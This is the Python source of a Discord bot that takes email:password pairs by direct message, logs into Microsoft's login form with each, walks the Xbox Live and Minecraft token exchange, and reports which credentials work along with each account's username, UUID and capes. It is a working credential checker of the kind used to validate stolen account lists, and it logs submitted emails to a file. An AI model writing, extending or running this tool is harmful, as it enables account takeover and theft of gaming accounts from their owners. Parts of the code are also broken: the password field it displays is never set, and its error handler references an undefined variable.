import discord
from discord.ext import commands
import asyncio
import aiohttp
import re
import json
import time
import os
from urllib.parse import urlparse, parse_qs
import logging
from datetime import datetime

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_minecraft.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('MinecraftBot')

class MinecraftVerifier:
    def __init__(self):
        self.sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
    
    async def get_urlPost_sFTTag(self, session):
        """Obtiene tokens iniciales para autenticación"""
        try:
            async with session.get(self.sFTTag_url, timeout=30) as response:
                text = await response.text()
                
            # Buscar sFTTag
            sFTTag_match = re.search(r'value="([^"]+)"\s+name="PPFT"', text)
            if not sFTTag_match:
                return None, None
                
            sFTTag = sFTTag_match.group(1)
            
            # Buscar urlPost
            urlPost_match = re.search(r'urlPost:\'([^\']+)\'', text)
            if urlPost_match:
                urlPost = urlPost_match.group(1)
                return urlPost, sFTTag
                
        except Exception as e:
            logger.error(f"Error getting tokens: {e}")
            return None, None
    
    async def get_xbox_token(self, session, email, password, urlPost, sFTTag):
        """Autentica con Microsoft y obtiene token Xbox"""
        try:
            data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sFTTag
            }
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            async with session.post(urlPost, data=data, headers=headers, allow_redirects=False) as response:
                # Verificar redirect con token
                if 'Location' in response.headers:
                    location = response.headers['Location']
                    if 'access_token' in location:
                        parsed = urlparse(location)
                        fragment = parse_qs(parsed.fragment)
                        token = fragment.get('access_token', [None])[0]
                        if token:
                            return token, "SUCCESS"
                
                # Seguir redirect manualmente
                if response.status in [301, 302, 303]:
                    redirect_url = response.headers.get('Location', '')
                    if redirect_url:
                        async with session.get(redirect_url, allow_redirects=True) as final_response:
                            final_url = str(final_response.url)
                            if 'access_token' in final_url:
                                parsed = urlparse(final_url)
                                fragment = parse_qs(parsed.fragment)
                                token = fragment.get('access_token', [None])[0]
                                if token:
                                    return token, "SUCCESS"
                
                # Verificar errores
                response_text = await response.text()
                
                if any(value in response_text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"]):
                    return None, "2FA_REQUIRED"
                elif any(value in response_text.lower() for value in ["password is incorrect", "invalid credentials"]):
                    return None, "INVALID_CREDENTIALS"
                elif "tried to sign in too many times" in response_text.lower():
                    return None, "TOO_MANY_ATTEMPTS"
                    
        except asyncio.TimeoutError:
            return None, "TIMEOUT"
        except Exception as e:
            return None, "AUTH_ERROR"
            
        return None, "AUTH_FAILED"
    
    async def get_minecraft_token(self, session, xbox_token):
        """Obtiene token de Minecraft"""
        try:
            # Autenticar con Xbox Live
            xbox_payload = {
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com", 
                    "RpsTicket": xbox_token
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            
            async with session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json=xbox_payload,
                headers={'Content-Type': 'application/json'}
            ) as response:
                if response.status != 200:
                    return None
                    
                xbox_data = await response.json()
                xbox_token = xbox_data.get('Token')
                uhs = xbox_data['DisplayClaims']['xui'][0]['uhs']
            
            # Obtener token XSTS
            xsts_payload = {
                "Properties": {
                    "SandboxId": "RETAIL",
                    "UserTokens": [xbox_token]
                },
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            }
            
            async with session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json=xsts_payload,
                headers={'Content-Type': 'application/json'}
            ) as response:
                if response.status != 200:
                    return None
                    
                xsts_data = await response.json()
                xsts_token = xsts_data.get('Token')
            
            # Obtener token de Minecraft
            mc_payload = {
                'identityToken': f"XBL3.0 x={uhs};{xsts_token}"
            }
            
            async with session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json=mc_payload,
                headers={'Content-Type': 'application/json'}
            ) as response:
                if response.status == 200:
                    mc_data = await response.json()
                    return mc_data.get('access_token')
                    
        except Exception as e:
            logger.error(f"Error getting Minecraft token: {e}")
            
        return None
    
    async def get_minecraft_profile(self, session, mc_token):
        """Obtiene el perfil de Minecraft - EXTIENDE AUTOMÁTICAMENTE EL IGN"""
        try:
            headers = {
                'Authorization': f'Bearer {mc_token}',
                'Content-Type': 'application/json'
            }
            
            async with session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers=headers
            ) as response:
                
                if response.status == 200:
                    profile_data = await response.json()
                    username = profile_data.get('name', 'N/A')
                    uuid = profile_data.get('id', 'N/A')
                    capes = [cape["alias"] for cape in profile_data.get("capes", [])]
                    
                    # ✅ AQUÍ ES DONDE EXTRAE EL IGN AUTOMÁTICAMENTE
                    return {
                        'username': username,
                        'uuid': uuid,
                        'capes': ", ".join(capes) if capes else "Ninguna",
                        'success': True,
                        'has_minecraft': True
                    }
                elif response.status == 404:
                    # Cuenta no tiene perfil de Minecraft (sin IGN)
                    return {
                        'username': 'N/A',
                        'uuid': 'N/A', 
                        'capes': 'Ninguna',
                        'success': True,
                        'has_minecraft': False
                    }
                    
        except Exception as e:
            logger.error(f"Error getting Minecraft profile: {e}")
            
        return {'success': False, 'error': 'Failed to get profile', 'has_minecraft': False}
    
    async def check_account_ownership(self, session, mc_token):
        """Verifica los productos de Minecraft"""
        try:
            headers = {'Authorization': f'Bearer {mc_token}'}
            
            async with session.get(
                'https://api.minecraftservices.com/entitlements/license',
                headers=headers
            ) as response:
                
                if response.status == 200:
                    data = await response.json()
                    items = data.get("items", [])
                    
                    has_minecraft = any(
                        item.get("name") in ["game_minecraft", "product_minecraft"] 
                        for item in items
                    )
                    
                    return has_minecraft
                            
        except Exception as e:
            logger.error(f"Error checking ownership: {e}")
            
        return False
    
    async def verify_account(self, email, password):
        """Verifica una cuenta completa de Minecraft - CON EXTRACCIÓN DE IGN"""
        logger.info(f"🔍 Verificando cuenta y extrayendo IGN: {email}")
        
        async with aiohttp.ClientSession() as session:
            try:
                # Paso 1: Tokens iniciales
                urlPost, sFTTag = await self.get_urlPost_sFTTag(session)
                if not urlPost:
                    return {
                        "success": False, 
                        "email": email,
                        "error": "No se pudieron obtener tokens iniciales",
                        "has_minecraft": False
                    }
                
                # Paso 2: Autenticación Microsoft
                xbox_token, auth_status = await self.get_xbox_token(session, email, password, urlPost, sFTTag)
                if auth_status != "SUCCESS":
                    return {
                        "success": False,
                        "email": email, 
                        "error": auth_status,
                        "has_minecraft": False
                    }
                
                # Paso 3: Token Minecraft
                mc_token = await self.get_minecraft_token(session, xbox_token)
                if not mc_token:
                    return {
                        "success": False,
                        "email": email,
                        "error": "No se pudo obtener token de Minecraft",
                        "has_minecraft": False
                    }
                
                # Paso 4: Perfil Minecraft - ✅ AQUÍ EXTRAE EL IGN
                profile = await self.get_minecraft_profile(session, mc_token)
                if not profile['success']:
                    return {
                        "success": False,
                        "email": email,
                        "error": profile.get('error', 'Error obteniendo perfil'),
                        "has_minecraft": False
                    }
                
                # Paso 5: Verificar si tiene Minecraft
                has_minecraft = await self.check_account_ownership(session, mc_token)
                
                return {
                    "success": True,
                    "email": email,
                    "minecraft_profile": profile,
                    "has_minecraft": has_minecraft,
                    "verification_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                
            except Exception as e:
                logger.error(f"Error in verify_account: {e}")
                return {
                    "success": False,
                    "email": email,
                    "error": f"Error inesperado: {str(e)}",
                    "has_minecraft": False
                }

class MinecraftBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.messages = True
        intents.dm_messages = True
        intents.message_content = True
        
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None
        )
        
        self.verifier = MinecraftVerifier()
        self.user_attempts = {}
        self.verification_log = []
        
    async def on_ready(self):
        logger.info(f'🤖 Bot conectado como {self.user.name}')
        await self.change_presence(activity=discord.Game(name="Verificando cuentas Minecraft | !help"))
    
    async def on_message(self, message):
        if message.author == self.user:
            return
        
        # Solo responder a DMs
        if isinstance(message.channel, discord.DMChannel):
            await self.handle_dm(message)
        
        await self.process_commands(message)
    
    async def handle_dm(self, message):
        """Maneja mensajes directos - CON EXIGENCIA DE IGN"""
        content = message.content.strip()
        
        # Ignorar comandos
        if content.startswith('!'):
            return
        
        # Verificar formato
        if ':' not in content:
            embed = discord.Embed(
                title="❌ Formato Incorrecto",
                description="Envía las cuentas en formato: `email:contraseña`",
                color=0xff0000
            )
            await message.reply(embed=embed)
            return
        
        # Limitar intentos
        user_id = message.author.id
        if user_id not in self.user_attempts:
            self.user_attempts[user_id] = {'count': 0, 'last_attempt': time.time()}
        
        user_data = self.user_attempts[user_id]
        
        # Resetear contador si pasó mucho tiempo
        if time.time() - user_data['last_attempt'] > 300:
            user_data['count'] = 0
        
        # Limitar a 5 verificaciones por 5 minutos
        if user_data['count'] >= 5:
            embed = discord.Embed(
                title="⏰ Límite Alcanzado",
                description="Límite: 5 verificaciones cada 5 minutos.",
                color=0xffa500
            )
            await message.reply(embed=embed)
            return
        
        user_data['count'] += 1
        user_data['last_attempt'] = time.time()
        
        # Mensaje de procesamiento
        processing_embed = discord.Embed(
            title="🔍 Verificando Cuenta...",
            description="Extrayendo IGN y verificando Minecraft...",
            color=0x00ffff
        )
        processing_msg = await message.reply(embed=processing_embed)
        
        try:
            # Verificar la cuenta
            email, password = content.split(':', 1)
            result = await self.verifier.verify_account(email.strip(), password.strip())
            
            # Log
            self.verification_log.append({
                'user_id': user_id,
                'username': str(message.author),
                'email': email,
                'minecraft_ign': result.get('minecraft_profile', {}).get('username', 'N/A'),
                'has_minecraft': result.get('has_minecraft', False),
                'success': result['success'],
                'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            
            # Guardar log
            if len(self.verification_log) >= 10:
                self.save_verification_log()
            
            # Eliminar mensaje de procesamiento
            await processing_msg.delete()
            
            # Enviar resultado
            if result["success"]:
                await self.send_success_embed(message, result)
            else:
                await self.send_error_embed(message, result)
                
        except Exception as e:
            logger.error(f"Error handling DM: {e}")
            await processing_msg.delete()
            
            error_embed = discord.Embed(
                title="❌ Error Interno",
                description="Error al procesar la cuenta.",
                color=0xff0000
            )
            await message.reply(embed=embed)
    
    async def send_success_embed(self, message, result):
        """Envía embed de éxito - EXIGE MOSTRAR EL IGN"""
        profile = result['minecraft_profile']
        has_minecraft = result['has_minecraft']
        
        # ✅ AQUÍ ES DONDE EXIGE MOSTRAR EL IGN
        if has_minecraft and profile['username'] != 'N/A':
            # Cuenta VÁLIDA con IGN
            embed = discord.Embed(
                title="✅ **CUENTA VERIFICADA CON IGN**",
                description=f"**¡Cuenta verificada exitosamente!**\nEl IGN ha sido extraído automáticamente.",
                color=0x00ff00,
                timestamp=datetime.now()
            )
            
            embed.add_field(
                name="👤 INFORMACIÓN DE LA CUENTA",
                value=f"**Email:** ||{result['email']}||\n**Contraseña:** ||{result.get('password', 'N/A')}||",
                inline=False
            )
            
            embed.add_field(
                name="🎮 **IGN DE MINECRAFT**",
                value=f"```\n{profile['username']}\n```",
                inline=False
            )
            
            embed.add_field(
                name="📊 DETALLES TÉCNICOS",
                value=f"**UUID:** `{profile['uuid']}`\n**Capas:** {profile['capes']}\n**Tiene Minecraft:** ✅ Sí",
                inline=False
            )
            
            # Agregar avatar de Minecraft
            embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{profile['username']}")
            
        elif has_minecraft and profile['username'] == 'N/A':
            # Tiene Minecraft pero no tiene IGN (cuenta nueva)
            embed = discord.Embed(
                title="⚠️ **CUENTA CON MINECRAFT PERO SIN IGN**",
                description="La cuenta tiene Minecraft pero no tiene nombre de usuario asignado.",
                color=0xffa500,
                timestamp=datetime.now()
            )
            
            embed.add_field(
                name="👤 INFORMACIÓN",
                value=f"**Email:** ||{result['email']}||\n**Estado:** Cuenta nueva sin IGN\n**Tiene Minecraft:** ✅ Sí",
                inline=False
            )
            
        else:
            # Correo válido pero sin Minecraft
            embed = discord.Embed(
                title="📧 **CORREO VÁLIDO SIN MINECRAFT**",
                description="La cuenta de Microsoft es válida pero no tiene Minecraft.",
                color=0x3498db,
                timestamp=datetime.now()
            )
            
            embed.add_field(
                name="👤 INFORMACIÓN",
                value=f"**Email:** ||{result['email']}||\n**Tiene Minecraft:** ❌ No\n**IGN:** No disponible",
                inline=False
            )
        
        embed.add_field(
            name="⏰ VERIFICACIÓN",
            value=f"**Hora:** {result['verification_time']}\n**Estado:** Verificación completada",
            inline=False
        )
        
        embed.set_footer(text=f"Verificado por {self.user.name}", icon_url=self.user.avatar.url)
        
        await message.reply(embed=embed)
    
    async def send_error_embed(self, message, result):
        """Envía embed de error"""
        error_messages = {
            "INVALID_CREDENTIALS": "❌ **Credenciales Inválidas**\nEl email o contraseña son incorrectos.",
            "2FA_REQUIRED": "⚠️ **Autenticación de Dos Factores**\nLa cuenta requiere 2FA.",
            "TOO_MANY_ATTEMPTS": "🔒 **Demasiados Intentos**\nCuenta bloqueada temporalmente.",
            "TIMEOUT": "⏰ **Timeout**\nLa verificación tardó demasiado tiempo.",
            "AUTH_FAILED": "❌ **Error de Autenticación**\nFalló la autenticación con Microsoft."
        }
        
        error_msg = error_messages.get(result['error'], f"❌ **Error:** {result['error']}")
        
        embed = discord.Embed(
            title="❌ **VERIFICACIÓN FALLIDA**",
            description=error_msg,
            color=0xff0000,
            timestamp=datetime.now()
        )
        
        embed.add_field(
            name="📧 CUENTA",
            value=f"**Email:** ||{result['email']}||",
            inline=False
        )
        
        embed.add_field(
            name="🎮 IGN",
            value="No se pudo extraer - Verificación fallida",
            inline=False
        )
        
        embed.set_footer(text=f"Verificado por {self.user.name}", icon_url=self.user.avatar.url)
        
        await message.reply(embed=embed)
    
    def save_verification_log(self):
        """Guarda el log de verificaciones"""
        try:
            with open('verification_log.json', 'w', encoding='utf-8') as f:
                json.dump(self.verification_log, f, indent=2, ensure_ascii=False)
            self.verification_log.clear()
        except Exception as e:
            logger.error(f"Error saving log: {e}")

    # Comandos del bot
    @commands.command()
    async def help(self, ctx):
        """Muestra ayuda del bot"""
        embed = discord.Embed(
            title="🤖 Minecraft Account Verifier",
            description="**Verifica cuentas de Minecraft y extrae IGN automáticamente**",
            color=0x00ffff
        )
        
        embed.add_field(
            name="📝 CÓMO USAR",
            value="Envía un DM al bot con:\n`email:contraseña`\n\n**El bot extraerá automáticamente:**\n• IGN de Minecraft\n• UUID\n• Capas\n• Tipo de cuenta",
            inline=False
        )
        
        embed.add_field(
            name="✅ RESULTADOS",
            value="**Cuenta válida con IGN** ✅\n**Cuenta con Minecraft sin IGN** ⚠️\n**Correo válido sin Minecraft** 📧\n**Credenciales inválidas** ❌",
            inline=False
        )
        
        embed.add_field(
            name="⚡ LÍMITES",
            value="• 5 verificaciones cada 5 minutos\n• Solo por Mensajes Directos\n• Formato: email:contraseña",
            inline=False
        )
        
        embed.set_footer(text="Bot especializado en extracción de IGN de Minecraft")
        
        await ctx.send(embed=embed)

# Configuración y ejecución
def load_config():
    """Carga la configuración del bot"""
    config = {
        "token": os.getenv("DISCORD_TOKEN"),
        "log_channel": os.getenv("LOG_CHANNEL_ID")
    }
    
    if not config["token"] and os.path.exists("config_bot.json"):
        with open("config_bot.json", "r") as f:
            file_config = json.load(f)
            config.update(file_config)
    
    return config

async def main():
    config = load_config()
    
    if not config["token"]:
        logger.error("❌ No se encontró el token del bot")
        logger.info("💡 Crea config_bot.json con tu token o usa DISCORD_TOKEN")
        return
    
    bot = MinecraftBot()
    bot.uptime = datetime.now()
    
    try:
        await bot.start(config["token"])
    except KeyboardInterrupt:
        logger.info("Bot detenido por el usuario")
    except Exception as e:
        logger.error(f"Error starting bot: {e}")
    finally:
        await bot.close()

if __name__ == "__main__":
    asyncio.run(main())
